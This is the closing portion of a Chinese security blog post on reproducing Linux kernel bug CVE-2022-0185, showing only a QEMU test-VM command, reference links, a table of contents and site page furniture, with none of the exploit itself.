rw&quot;</span> \</span><br><span class="line">  -hda ./bullseye.img \</span><br><span class="line">  -enable-kvm -m 3G -nographic \</span><br><span class="line">  -netdev user,id=t0, -device rtl8139,netdev=t0,id=nic0 \</span><br><span class="line">  -netdev user,id=t1, -device pcnet,netdev=t1,id=nic1 \</span><br><span class="line">  -s</span><br></pre></td></tr></table></figure>

<hr>
<p>参考链接：</p>
<p>​    <a class="link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2023/01/11/CVE-0X09-CVE-2022-0185/" >https://arttnba3.cn/2023/01/11/CVE-0X09-CVE-2022-0185/<i class="fas fa-external-link-alt"></i></a></p>
<p>​    <a class="link"   target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/93592262" >https://zhuanlan.zhihu.com/p/93592262<i class="fas fa-external-link-alt"></i></a></p>
<p>​    <a class="link"   target="_blank" rel="noopener" href="https://www.willsroot.io/2022/01/cve-2022-0185.html" >https://www.willsroot.io/2022/01/cve-2022-0185.html<i class="fas fa-external-link-alt"></i></a></p>
<p>​    <a class="link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.4/source" >https://elixir.bootlin.com/linux/v5.4/source<i class="fas fa-external-link-alt"></i></a></p>
<p>​    <a class="link"   target="_blank" rel="noopener" href="https://github.com/Crusaders-of-Rust/CVE-2022-0185" >https://github.com/Crusaders-of-Rust/CVE-2022-0185<i class="fas fa-external-link-alt"></i></a></p>

        </div>

        

        
            <div class="article-nav">
                
                    <div class="article-prev">
                        <a class="prev"
                           rel="prev"
                           href="/2023/10/27/CVE-2022-2588/"
                        >
                            <span class="left arrow-icon flex-center">
                              <i class="fas fa-chevron-left"></i>
                            </span>
                            <span class="title flex-center">
                                <span class="post-nav-title-item">CVE-2022-2588复现</span>
                                <span class="post-nav-item">上一篇</span>
                            </span>
                        </a>
                    </div>
                
                
                    <div class="article-next">
                        <a class="next"
                           rel="next"
                           href="/2023/09/30/%E6%B5%85%E5%B0%9Ddocker-escape/"
                        >
                            <span class="title flex-center">
                                <span class="post-nav-title-item">浅尝docker escape</span>
                                <span class="post-nav-item">下一篇</span>
                            </span>
                            <span class="right arrow-icon flex-center">
                              <i class="fas fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        

        
            <div class="comment-container">
                <div class="comments-container">
    <div id="comment-anchor"></div>
    <div class="comment-area-title">
        <i class="fas fa-comments">&nbsp;评论</i>
    </div>
    

        
            
    <div class="valine-container">
        <script 
                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
        <div id="vcomments"></div>
        <script >
            function loadValine() {
                new Valine({
                    el: '#vcomments',
                    appId: 'OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz',
                    appKey: 'C672AAYGXMkHxztf8ntdLShs',
                    meta: ['nick', 'mail', 'link'],
                    avatar: 'wavatar',
                    enableQQ: true,
                    placeholder: '😜若有问题请各位大师傅留言评论',
                    lang: 'zh-CN'.toLowerCase()
                });

                function getAuthor(language) {
                    switch (language) {
                        case 'en':
                            return 'Author';
                        case 'zh-CN':
                            return '博主';
                        default:
                            return 'Master';
                    }
                }

                // Add "Author" identify
                const getValineDomTimer = setInterval(() => {
                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
                    if (vcards.length > 0) {
                        let author = '196082';

                        if (author) {
                            for (let vcard of vcards) {
                                const vnick_dom = vcard.querySelector('.vhead .vnick');
                                const vnick = vnick_dom.innerHTML;
                                if (vnick === author) {
                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
                                }
                            }
                        }
                        clearInterval(getValineDomTimer);
                    } else {
                        clearInterval(getValineDomTimer);
                    }
                }, 2000);
            }

            if ('false') {
                const loadValineTimeout = setTimeout(() => {
                    loadValine();
                    clearTimeout(loadValineTimeout);
                }, 1000);
            } else {
                window.addEventListener('DOMContentLoaded', loadValine);
            }
        </script>
    </div>



        
    
</div>

            </div>
        
    </div>
</div>


                
            </div>

        </div>

        <div class="page-main-content-bottom">
            <footer class="footer">
    <div class="info-container">
        <div class="copyright-info info-item">
            &copy;
            
              <span>2021</span>&nbsp;-&nbsp;
            
            2024&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">196082</a>
        </div>
        
            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="website-count info-item">
                
                    <span id="busuanzi_container_site_uv">
                        访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
                    </span>
                
                
                    <span id="busuanzi_container_site_pv">
                        总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="theme-info info-item">
            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
        </div>
        
    </div>
</footer>

        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="tools-list">
        <!-- TOC aside toggle -->
        
            <li class="tools-item page-aside-toggle">
                <i class="fas fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
            <li class="go-comment">
                <i class="fas fa-comment"></i>
            </li>
        
    </ul>
</div>

        </div>
    

    <div class="right-bottom-side-tools">
        <div class="side-tools-container">
    <ul class="side-tools-list">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-expand-width flex-center">
            <i class="fas fa-arrows-alt-h"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        
            <li class="tools-item rss flex-center">
                <a class="flex-center"
                   href="/atom.xml"
                   target="_blank"
                >
                    <i class="fas fa-rss"></i>
                </a>
            </li>
        

        
            <li class="tools-item tool-scroll-to-top flex-center">
                <i class="fas fa-arrow-up"></i>
            </li>
        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list">
        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>
        
    </ul>
</div>

    </div>

    
        <aside class="page-aside">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Filesystem-mount-API-%E5%88%86%E6%9E%90"><span class="nav-text">Filesystem mount API 分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#fsopen"><span class="nav-text">fsopen</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fsconfig"><span class="nav-text">fsconfig</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fsmount"><span class="nav-text">fsmount</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#move-mount"><span class="nav-text">move_mount</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#FUSE"><span class="nav-text">FUSE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pipe-buffer"><span class="nav-text">pipe_buffer</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E9%83%A8%E9%9A%94%E7%A6%BB%E5%88%86%E6%9E%90"><span class="nav-text">内部隔离分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#msg-msg"><span class="nav-text">msg_msg</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%BC%E4%B8%8A%E5%8F%AF%E5%BE%97exp"><span class="nav-text">综上可得exp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B8%A9%E5%9D%91%E8%AE%B0"><span class="nav-text">踩坑记</span></a></li></ol></li></ol>
    </div>
</div>
        </aside>
    

    <div class="image-viewer-container">
    <img src="">
</div>


    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="搜索..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="popup-btn-close">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

</main>



<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/dark-light-toggle.js"></script>


    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/local-search.js"></script>



    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/code-copy.js"></script>



    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/lazyload.js"></script>


<div class="post-scripts">
    
        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/toc.js"></script>
    
</div>



</body>
</html>
